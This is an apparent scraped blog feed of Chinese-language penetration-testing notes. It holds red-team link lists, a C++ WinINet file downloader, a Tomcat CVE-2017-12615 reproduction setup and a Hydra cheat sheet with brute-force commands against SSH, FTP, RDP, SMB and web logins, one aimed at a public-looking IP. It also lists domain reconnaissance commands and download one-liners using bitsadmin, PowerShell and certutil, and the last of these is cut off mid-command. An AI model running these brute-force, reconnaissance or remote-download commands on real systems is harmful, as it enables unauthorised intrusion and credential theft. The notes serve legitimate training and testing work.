https://github.com/FuzzySecurity/PowerShell-Suite https://github.com/nettitude/Powershell https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts https://github.com/threatexpress/red-team-scripts https://github.com/SadProcessor/SomeStuff https://github.com/rvrsh3ll/Misc-Powershell-Scripts https://github.com/enigma0x3/Misc-PowerShell-Stuff https://github.com/ChrisTruncer/PenTestScripts https://github.com/bluscreenofjeff/Scripts https://github.com/xorrior/RandomPS-Scripts https://github.com/xorrior/Random-CSharpTools https://github.com/leechristensen/Random https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering References MITRE’s ATT&amp;CK™ is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s lifecycle and the platforms they are known to target. https://attack.mitre.org/wiki/Main_Page Cheat Sheets for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). https://github.com/HarmJ0y/CheatSheets PRE-ATT&amp;CK Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. https://attack.mitre.org/pre-attack/index.php/Main_Page Adversary OPSEC consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC Adversary Emulation Plans To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. https://attack.mitre.org/wiki/Adversary_Emulation_Plans Red-Team-Infrastructure-Wiki Wiki to collect Red Team infrastructure hardening resources. https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Advanced Threat Tactics – Course and Notes This is a course on red team operations and adversary simulations. https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes Red Team Tips as posted by @vysecurity on Twitter. https://vincentyiu.co.uk/red-team-tips Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources. https://github.com/yeyintminthuhtut/Awesome-Red-Teaming ATT&amp;CK for Enterprise Software is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. https://attack.mitre.org/wiki/Software Planning a Red Team exercise This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. https://github.com/magoo/redteam-plan Awesome Lockpicking a curated list of awesome guides, tools, and other resources related to the security and compromise of locks, safes, and keys. https://github.com/meitar/awesome-lockpicking Awesome Threat Intelligence a curated list of awesome Threat Intelligence resources. https://github.com/hslatman/awesome-threat-intelligence APT Notes Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. https://github.com/aptnotes/data TIBER-EU FRAMEWORK The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf CBEST Implementation Guide CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or “Red Teaming” Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf License]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wininet_downloader_cpp]]></title>
    <url>%2F2019%2F02%2F28%2Fwininet_downloader_cpp.html</url>
    <content type="text"><![CDATA[wininet.lib cpp 下载include &lt;windows.h&gt;#include &lt;wininet.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std; #pragma comment(lib, "wininet.lib") #define DOWNHELPER_AGENTNAME "downloader"#define LEN_OF_BUFFER_FOR_QUERYINFO 128#define DOWNLOAD_BUF_SIZE (10*1024) #define MAX_DOWNLOAD_REQUEST_TIME 10 #define MAX_DOWNLOAD_BYTESIZE (10000*1024*1024) BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes); BOOL DownloadUrl(std::string strUrl, std::string strFileName)&#123; BOOL bRet = FALSE; if (strUrl == "" || strFileName == "") return FALSE; HINTERNET hInet = NULL; HINTERNET hConnect = NULL; HINTERNET hRequestHead = NULL; HINTERNET hRequestGet = NULL; HANDLE hFileWrite = NULL; char* pBuf = NULL; DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME; DWORD dwDownBytes = 0; DWORD dwDownFileTotalBytes = 0; DWORD dwWriteBytes = 0; char bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;0&#125;; DWORD dwBufQueryInfoSize = sizeof(bufQueryInfo); DWORD dwStatusCode = 0; DWORD dwContentLen = 0; DWORD dwSizeDW = sizeof(DWORD); CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;0&#125;; CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;0&#125;; CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;0&#125;; CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; URL_COMPONENTSA urlComponents = &#123;0&#125;; urlComponents.dwStructSize = sizeof(URL_COMPONENTSA); urlComponents.lpszHostName = pszHostName; urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH; urlComponents.lpszUserName = pszUserName; urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH; urlComponents.lpszPassword = pszPassword; urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH; urlComponents.lpszUrlPath = pszURLPath; urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH; bRet = InternetCrackUrlA(strUrl.c_str(), 0, NULL, &amp;urlComponents); bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); if (!hInet) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, 0, NULL); if (!hConnect) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; if (urlComponents.dwUrlPathLength != 0) strcpy(szURL, urlComponents.lpszUrlPath); else strcpy(szURL, "/"); hRequestHead = HttpOpenRequestA(hConnect, "HEAD", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; dwContentLen = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, NULL); if (bRet) &#123; if (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; &#125; hRequestGet = HttpOpenRequestA(hConnect, "GET", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFileWrite) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; pBuf = new char[DOWNLOAD_BUF_SIZE]; if (!pBuf) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; dwDownFileTotalBytes = 0; while (1) &#123; dwDownBytes = 0; memset(pBuf, 0, DOWNLOAD_BUF_SIZE*sizeof(char)); bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes); if (bRet) &#123; if (dwDownBytes &gt; 0) &#123; dwDownFileTotalBytes += dwDownBytes; bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, NULL); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; &#125; else if (0 == dwDownBytes) &#123; bRet = TRUE; break; &#125; &#125; &#125; _END_OF_DOWNLOADURL: if (INVALID_HANDLE_VALUE != hFileWrite) CloseHandle(hFileWrite); if (pBuf) delete [] pBuf; if (hRequestGet) InternetCloseHandle(hRequestGet); if (hRequestHead) InternetCloseHandle(hRequestHead); if (hConnect) InternetCloseHandle(hConnect); if (hInet) InternetCloseHandle(hInet); return bRet;&#125; BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes)&#123; BOOL bRet = FALSE; DWORD dwStatusCode = 0; DWORD dwSizeDW = sizeof(DWORD); while (hRequest &amp;&amp; (nMaxTryTimes-- &gt; 0)) &#123; bRet = HttpSendRequestA(hRequest, NULL, 0, NULL, 0); if (!bRet) &#123; continue; &#125; else &#123; dwStatusCode = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, NULL); if (bRet) &#123; if (HTTP_STATUS_OK == dwStatusCode) &#123; break; &#125; else &#123; bRet = FALSE; continue; &#125; &#125; &#125; &#125; return bRet;&#125; int main(int argc, char* argv[])&#123; cout&lt;&lt; "pls input downloadurl:"; char str[80]; cin.get(str,80); BOOL bR = DownloadUrl(str, "temp.png"); cout &lt;&lt; "Downloading..."&lt;&lt;endl; if (bR) cout &lt;&lt; "ok" &lt;&lt; endl; else cout &lt;&lt; "no" &lt;&lt; endl; return 0;&#125;]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Red Teaming Tools]]></title>
    <url>%2F2019%2F02%2F28%2FAwesome%20Red%20Teaming.html</url>
    <content type="text"><![CDATA[Awesome Red TeamingList of Awesome Red Team / Red Teaming Resources This list is for anyone wishing to learn about Red Teaming but do not have a starting point. Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;CK You can help by sending Pull Requests to add more information. Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification ↑ Initial Access How To: Empire’s Cross Platform Office Macro Phishing with PowerPoint PHISHING WITH EMPIRE Bash Bunny OWASP Presentation of Social Engineering - OWASP USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23 Cobalt Strike - Spear Phishing documentation Cobalt Strike Blog - What’s the go-to phishing technique or exploit? Spear phishing with Cobalt Strike - Raphael Mudge EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE Phishing for access Excel macros with PowerShell PowerPoint and Custom Actions Macro-less Code Exec in MSWord Multi-Platform Macro Phishing Payloads Abusing Microsoft Word Features for Phishing: “subDoc” Phishing Against Protected View POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS The PlugBot: Hardware Botnet Research Project Luckystrike: An Evil Office Document Generator The Absurdly Underestimated Dangers of CSV Injection Macroless DOC malware that avoids detection with Yara rule Phishing between the app whitelists Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2) Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2) Social Engineer Portal 7 Best social Engineering attack Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012 USING THE DDE ATTACK WITH POWERSHELL EMPIRE Phishing on Twitter - POT Microsoft Office – NTLM Hashes via Frameset Defense-In-Depth write-up Spear Phishing 101 ↑ Execution Research on CMSTP.exe, Windows oneliners to download remote payload and execute arbitrary code Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts WSH Injection: A Case Study Gscript Dropper ↑ Persistence A View of Persistence hiding registry keys with psreflect Persistence using RunOnceEx – Hidden from Autoruns.exe Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe Putting data in Alternate data streams and how to execute it – part 2 WMI Persistence with Cobalt Strike Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2) Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction ↑ Privilege EscalationUser Account Control Bypass First entry: Welcome and fileless UAC bypass, Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, Reading Your Way Around UAC in 3 parts: Part 1. Part 2. Part 3. Bypassing UAC using App Paths, “Fileless” UAC Bypass using sdclt.exe, UAC Bypass or story about three escalations, “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking, Bypassing UAC on Windows 10 using Disk Cleanup, Using IARPUninstallStringLauncher COM interface to bypass UAC, Fileless UAC Bypass using sdclt Eventvwr File-less UAC Bypass CNA Windows 7 UAC whitelist Escalation Windows Privilege Escalation Checklist From Patch Tuesday to DA A Path for Privilege Escalation ↑ Defense Evasion Window 10 Device Guard Bypass App Locker ByPass List Window Signed Binary Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files) Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations Empire without powershell Powershell without Powershell to bypass app whitelist MS Signed mimikatz in just 3 steps Hiding your process from sysinternals code signing certificate cloning attacks and defenses userland api monitoring and code injection detection In memory evasion Bypassing AMSI via COM Server Hijacking process doppelganging Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5 VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION Putting data in Alternate data streams and how to execute it AppLocker – Case study – How insecure is it really? – Part 1 AppLocker – Case study – How insecure is it really? – Part 2 Harden Windows with AppLocker – based on Case study part 2 Harden Windows with AppLocker – based on Case study part 2 Office 365 Safe links bypass Windows Defender Attack Surface Reduction Rules bypass Bypassing Device guard UMCI using CHM – CVE-2017-8625 Bypassing Application Whitelisting with BGInfo Cloning and Hosting Evil Captive Portals using a Wifi PineApple https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/ Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts mavinject.exe Functionality Deconstructed ↑ Credential Access Windows Access Tokens and Alternate credentials Bringing the hashes home with reGeorg &amp; Empire Intercepting passwords with Empire and winning Local Administrator Password Solution (LAPS) Part 1 Local Administrator Password Solution (LAPS) Part 2 USING A SCF FILE TO GATHER HASHES Remote Hash Extraction On Demand Via Host Security Descriptor Modification Offensive Encrypted Data Storage Practical guide to NTLM Relaying Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync Dumping Domain Password Hashes ↑ Discovery Red Team Operating in a Modern Environment My First Go with BloodHound Introducing BloodHound A Red Teamer’s Guide to GPOs and OUs Automated Derivative Administrator Search A Pentester’s Guide to Group Scoping Local Group Enumeration The PowerView PowerUsage Series #1 - Mass User Profile Enumeration The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain The PowerView PowerUsage Series #4 – Finding cross-trust ACEs Aggressor PowerView Lay of the Land with BloodHound Scanning for Active Directory Privileges &amp; Privileged Accounts Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation SPN Discovery ↑ Lateral Movement A Citrx Story Jumping Network Segregation with RDP Pass hash pass ticket no pain Abusing DNSAdmins privilege for escalation in Active Directory Using SQL Server for attacking a Forest Trust Extending BloodHound for Red Teamers OPSEC Considerations for beacon commands My First Go with BloodHound Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws Lateral movement using excel application and dcom Lay of the Land with BloodHound The Most Dangerous User Right You (Probably) Have Never Heard Of Agentless Post Exploitation A Guide to Attacking Domain Trusts Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy Targeted Kerberoasting Kerberoasting Without Mimikatz Abusing GPO Permissions Abusing Active Directory Permissions with PowerView Roasting AS-REPs Getting the goods with CrackMapExec: Part 1 Getting the goods with CrackMapExec: Part 2 DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement a guide to attacking domain trusts Outlook Home Page – Another Ruler Vector Outlook Forms and Shells Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32 LethalHTA - A new lateral movement technique using DCOM and HTA Abusing DCOM For Yet Another Lateral Movement Technique ↑ Collection Accessing clipboard from the lock screen in Windows 10 Part 1 Accessing clipboard from the lock screen in Windows 10 Part 2 ↑ Exfiltration DNS Data exfiltration — What is this and How to use? DNS Tunnelling sg1: swiss army knife for data encryption, exfiltration &amp; covert communication Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator DET (extensible) Data Exfiltration Toolkit Data Exfiltration via Formula Injection Part1 ↑ Command and ControlDomain Fronting Empre Domain Fronting Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten Finding Frontable Domain TOR Fronting – Utilising Hidden Services for Privacy Simple domain fronting PoC with GAE C2 server Domain Fronting Via Cloudfront Alternate Domains Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate) Google Groups: Blog post on finding 2000+ Azure domains using Censys Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike SSL Domain Fronting 101 How I Identified 93k Domain-Frontable CloudFront Domains Validated CloudFront SSL Domains CloudFront Hijacking CloudFrunt GitHub Repo Connection Proxy Redirecting Cobalt Strike DNS Beacons Apache2Mod Rewrite Setup Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite High-reputation Redirectors and Domain Fronting Cloud-based Redirectors for Distributed Hacking Combatting Incident Responders with Apache mod_rewrite Operating System Based Redirection with Apache mod_rewrite Invalid URI Redirection with Apache mod_rewrite Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection mod_rewrite rule to evade vendor sandboxes Expire Phishing Links with Apache RewriteMap Serving random payloads with NGINX Mod_Rewrite Automatic Setup Hybrid Cobalt Strike Redirectors Expand Your Horizon Red Team – Modern SAAS C2 RTOps: Automating Redirector Deployment With Ansible Web Services C2 with Dropbox C2 with gmail C2 with twitter Office 365 for Cobalt Strike C2 Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike A stealthy Python based Windows backdoor that uses Github as a C&amp;C server External C2 (Third-Party Command and Control) Cobalt Strike over external C2 – beacon home in the most obscure ways External C2 for Cobalt Strike External C2 framework for Cobalt Strike External C2 framework - GitHub Repo Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs Exploring Cobalt Strike’s ExternalC2 framework Application Layer Protocol C2 WebSocket C2 WMI C2 Website C2 Image C2 Javascript C2 WebInterface C2 with DNS C2 with https C2 with webdav Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool InternetExplorer.Application for C2 Infrastructure Automated Red Team Infrastructure Deployment with Terraform - Part 1 Automated Red Team Infrastructure Deployment with Terraform - Part 2 Red Team Infrastructure - AWS Encrypted EBS 6 RED TEAM INFRASTRUCTURE TIPS How to Build a C2 Infrastructure with Digital Ocean – Part 1 Infrastructure for Ongoing Red Team Operations Attack Infrastructure Log Aggregation and Monitoring Randomized Malleable C2 Profiles Made Easy Migrating Your infrastructure ICMP C2 Using WebDAV features as a covert channel Safe Red Team Infrastructure EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT Command and Control Using Active Directory A Vision for Distributed Red Team Operations Designing Effective Covert Red Team Attack Infrastructure Serving Random Payloads with Apache mod_rewrite Mail Servers Made Easy Securing your Empire C2 with Apache mod_rewrite Automating Gophish Releases With Ansible and Docker How to Write Malleable C2 Profiles for Cobalt Strike How to Make Communication Profiles for Empire A Brave New World: Malleable C2 Malleable Command and Control ↑ Embedded and Peripheral Devices Hacking Gettting in with the Proxmark3 &amp; ProxBrute Practical Guide to RFID Badge copying Contents of a Physical Pentester Backpack MagSpoof - credit card/magstripe spoofer Wireless Keyboard Sniffer RFID Hacking with The Proxmark 3 Swiss Army Knife for RFID Exploring NFC Attack Surface Outsmarting smartcards Reverse engineering HID iClass Master keys Android Open Pwn Project (AOPP) ↑ Misc Red Tips of Vysec Cobalt Strike Tips for 2016 ccde red teams Models for Red Team Operations Planning a Red Team exercise Raphael Mudge - Dirty Red Team tricks introducing the adversary resilience methodology part 1 introducing the adversary resilience methodology part 2 Responsible red team Red Teaming for Pacific Rim CCDC 2017 How I Prepared to Red Team at PRCCDC 2015 Red Teaming for Pacific Rim CCDC 2016 Responsible Red Teams ↑ RedTeam GadgetsNetwork Implants LAN Tap Pro LAN Turtle Bash Bunny Packet SquirrelWifi Auditing WiFi Pineapple Alpha Long range Wireless USB Wifi-Deauth Monster Crazy PAIoT BLE Key Proxmark3 Zigbee Sniffer Attify IoT Exploit kitSoftware Defined Radio - SDR HackRF One Bundle RTL-SDR YARD stick one Bundle UbertoothMisc Key Grabber Magspoof Poison tap keysweeper USB Rubber Ducky ↑ Ebooks Next Generation Red Teaming Targeted Cyber Attack Advanced Penetration Testing: Hacking the World’s Most Secure Networks Social Engieers’ Playbook Pretical Pretexting ↑ Training ( Free ) Tradecraft - a course on red team operations Advanced Threat Tactics Course &amp; Notes ↑ Certification CREST Certified Simulated Attack Specialist CREST Certified Simulated Attack Manager SEC564: Red Team Operations and Threat Emulation ELearn Security Penetration Testing eXtreme]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-12615漏洞复现]]></title>
    <url>%2F2019%2F02%2F28%2FCVE-2017-12615.html</url>
    <content type="text"><![CDATA[漏洞利用条件和方式: CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。 CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80 CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79 安装tomcat U:test P:test123 JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25 CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; Path= %JAVA_HOME%/bin 新增2个变量 CATALINA_HOME= tomcat路径 CATALINA_BASE= tomcat路径 CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar 1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成” 3、Server.xml 123&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;connectionTimeout=&quot;20000&quot;redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt; C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml 增加 123456 &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; 提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制： 7.0.81]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydra 的使用]]></title>
    <url>%2F2019%2F02%2F26%2Fhydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[字典集https://www.weakpass.com/1.破解ssh（1）破解指定用户名密码 hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ssh -l 用户名 -P 密码字典 -e ns -vV （2）批量破解ssh账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -Vhydra -L list_user -P list_password 192.168.56.101 ssh -V 2.破解ftp （1）破解指定用户名密码 hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV （2）批量破解FTP账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -Vhydra -L list_user -P list_password 192.168.56.101 ftp -V 3．GET方式提交，破解Web登录 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录 （1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password” hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V （2）对admin密码进行破解 hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password“ “-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解； 5．破解HTTPS hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https 6．破解teamspeak hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 7．破解Cisco hydra -P pass.txt 192.168.0.115 ciscohydra -m cloud -P pass.txt 192.168.0.115 cisco-enable 8．破解SMB hydra -l administrator -P pass.txt 192.168.0.115 smb 9．破解POP3 hydra -l muts -P pass.txt my.pop3.mail pop3 10．破解远程终端账号 （1）破解管理员账号 hydra ip rdp -l administrator -P pass.txt -V （2）批量破解账号 hydra -s 3389 192.168.44.138 rdp -L user.txt -P pwd.txt –V 11．破解HTTP-Proxy hydra -l admin -P pass.txt http-proxy://192.168.0.115 12．破解IMAP hydra -L user.txt -p secret 192.168.0.115 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透小记]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[常用一句话webshellhttps://github.com/tennc/webshell 信息收集1234567891011121314151617181920212223242526272829303132333435363738dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt; 查看dns列表（DC执行）tasklist /SVC 查看系统进程及其描述query user || qwinsta 查看当前在线用户net user 查看本机用户net user /domain 查看域用户net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc 查看 dc 域内共享文件net group /domain 查看域里面的组net group &quot;domain admins&quot; /domain 查看域管net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管net group &quot;domain controllers&quot; /domain 域控net time /domain net config workstation 当前登录域 - 计算机名 - 用户名net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfigsysteminfotasklist /svc 详细进程信息tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklisttaskkill /im imagename /f 结束进程net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx 查看域控nltest /domain_trusts 查看域信任信息whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share 共享目录cmdkey /l 查看保存登陆凭证echo %logonserver% 查看登陆域spn –l administrator spn 记录set 环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -atracert 查路由 windows 下载文件 bitsadmin 12download文件bitsadmin /transfer n https://www.baidu.com/robots.txt c:\1.txt powershell 12345一条命令download文件powershell (new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/robots.txt','C:\1.txt')多条命令download文件$client = new-object System.Net.WebClient$client.DownloadFile('https://www.baidu.com/robots.txt', 'C:\1.txt') certutil.exe 1cmd.exe /c certutil.exe -urlcache -split -f 